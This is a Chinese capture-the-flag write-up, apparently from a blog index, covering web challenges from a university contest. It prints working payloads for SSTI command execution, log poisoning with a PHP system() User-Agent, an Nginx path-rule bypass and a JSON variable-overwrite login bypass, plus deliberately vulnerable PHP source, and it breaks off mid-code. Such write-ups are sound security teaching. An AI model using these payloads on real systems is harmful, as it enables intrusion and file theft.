<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>成都大学第八届玄武杯（ak）</title>
      <link href="/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"/>
      <url>/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="锦家有什么"><a href="#锦家有什么" class="headerlink" title="锦家有什么"></a>锦家有什么</h2><p>查看源码发现&#x2F;try_a_try</p><p><img src="/images/achieve/2025/11/1.png"></p><p>直接猜参数是name果真！果然也是ssti直接秒了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try<span class="built_in">_</span>a<span class="built_in">_</span>try?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;tac /f*&#x27;).read()&#125;&#125;</span><br><span class="line">NSSCTF&#123;191c23bd-63f0-4383-8719-15471a3e78e8&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><p>这题就不分析代码了，?page&#x3D;&#x2F;flag就直接秒了！有个加强版的，待会直接就在那题分析代码了！</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;216a17fb-19f6-49e7-863b-bd0eb63d86b7&#125;</span><br></pre></td></tr></table></figure><h2 id="normal-php"><a href="#normal-php" class="headerlink" title="normal_php"></a>normal_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>]!==<span class="variable">$c</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="variable">$num1</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$num2</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">10520</span>,<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;记住这个数&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;这都记不住?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num2</span>==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;我不想要这个数字!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;还想十六进制绕过?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$num2</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;还想八进制绕过?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span>,<span class="number">0</span>)==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好了你可以去下一关了&quot;</span>.<span class="variable">$next</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我现在又想要了,嘻嘻&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不er,md5你不会&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你看看传什么呢&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str($a,$b);</code>将字符串$a解析成数组存入$b</p><p><code>if(strpos($num2, &quot;0&quot;))</code>0在第一位返回的就是0，所以可以直接8进制绕过</p><p>payload（&amp;要url编码不然就会被认为是参数分割符）</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=cdusec=QNKCDZO<span class="comment">%26num[]=10520%26num[]=0337522</span></span><br><span class="line">post:</span><br><span class="line">c=240610708</span><br></pre></td></tr></table></figure><p>第二关&#x2F;leeevvvel2222222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag在/flag中，试着读读?</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|filter|base64|text|read|resource|\=|\&#x27;|\&quot;|\,/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪协议都用不了有waf，那就日志包含，apache服务器</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache/access.log之前一直以为是这个，但是查了一下现在不是了</span><br><span class="line">/var/log/apache2/access.log是这个，直接打就行了</span><br><span class="line">curl -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; &quot;http://node10.anna.nssctf.cn:22383/leeevvvel2222222.php&quot;</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;4c29beda-b185-46bc-9fb2-efccf4b193b9&#125;</span><br></pre></td></tr></table></figure><h2 id="眼见不一定为实"><a href="#眼见不一定为实" class="headerlink" title="眼见不一定为实"></a>眼见不一定为实</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/secret&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NSSCTF&#123;default&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>直接访问403禁止看下题目</p><p><img src="/images/achieve/2025/11/2.png"></p><p>Nginx 和 Python 对 URL 路径的解析方式可能不同，意思就是让我们弄个路径Nginx不能解析成&#x2F;secret，但是python可以解析成&#x2F;secret</p><p>上网查了一下还真有<a href="https://xz.aliyun.com/news/18629">Nginx 路径绕过-先知社区</a></p><p>nginx.config</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server<span class="built_in">_</span>name  localhost;</span><br><span class="line"></span><br><span class="line">    location ~* <span class="built_in">^</span>/secret/?<span class="built_in">$</span> &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~* <span class="built_in">^</span>/secret/ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy<span class="built_in">_</span>pass http://127.0.0.1:8080;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header Host <span class="built_in">$</span>host;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Real-IP <span class="built_in">$</span>remote<span class="built_in">_</span>addr;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Forwarded-For <span class="built_in">$</span>proxy<span class="built_in">_</span>add<span class="built_in">_</span>x<span class="built_in">_</span>forwarded<span class="built_in">_</span>for;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Forwarded-Proto <span class="built_in">$</span>scheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nginx 配置的核心访问控制部分，我们看看它是怎么处理的可以看到它用正则匹配了所有的&#x2F;secret后面加或者不加任何东西，但是一些特殊的字符匹配不到，比如不可见字符\x85</p><p><img src="/images/achieve/2025/11/3.png"></p><p>改成85发包即可！</p><h2 id="ez-file"><a href="#ez-file" class="headerlink" title="ez_file"></a>ez_file</h2><p>开局就登录页面，扫出个&#x2F;<a href="http://www.zip/">www.zip</a></p><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#悄悄的，校内赛道第一个找到学长的秘密的私信学长秘密内容给奶茶喝</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#header(&#x27;Content-Type: application/json&#x27;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$params</span> = [];</span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line"><span class="variable">$admin_role</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] , <span class="string">&quot;application/json&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$raw</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid JSON&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果是普通表单请求</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ;</span><br><span class="line"><span class="comment">//    $params = [&#x27;username&#x27; =&gt; $username, &#x27;password&#x27; =&gt; $password];</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Unsupported request method&quot;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;456789&quot;</span> &amp;&amp; <span class="variable">$client_ip</span> === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$admin_role</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Login successful (local admin)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span> =&gt; <span class="variable">$client_ip</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;guest&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;123456&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$role</span>;</span><br><span class="line">    <span class="comment">#echo $role;</span></span><br><span class="line">    <span class="comment">#echo json_encode([&quot;status&quot; =&gt; &quot;success&quot;, &quot;message&quot; =&gt; &quot;Login successful&quot;, &quot;user&quot; =&gt; $username]);</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;failed&quot;</span>, <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Invalid username or password&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>肯定是想法子登录进去<code>$client_ip = $_SERVER[&#39;REMOTE_ADDR&#39;]</code>这玩意获取用户ip地址，即使知道账号密码也登录不进去！然后普通用户登录给我跳回来了，直接看index.php果然是<code>$_SESSION[&#39;role&#39;]</code></p><p>那不就正好用上了第一个if进行变量覆盖了吗，直接一次性覆盖三个变量</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;123456&quot;&#125;</span><br></pre></td></tr></table></figure><p>然后就登录上去了</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/secret&quot;</span>), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>] !== <span class="variable">$secret</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file too large&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#文件后缀白名单检测，我就不信你还能上传php文件，嘻嘻嘻</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file type not allow&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload to ./uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$black_list</span>=[<span class="string">&quot;php&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;pht&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$name</span>,<span class="variable">$black_list</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span 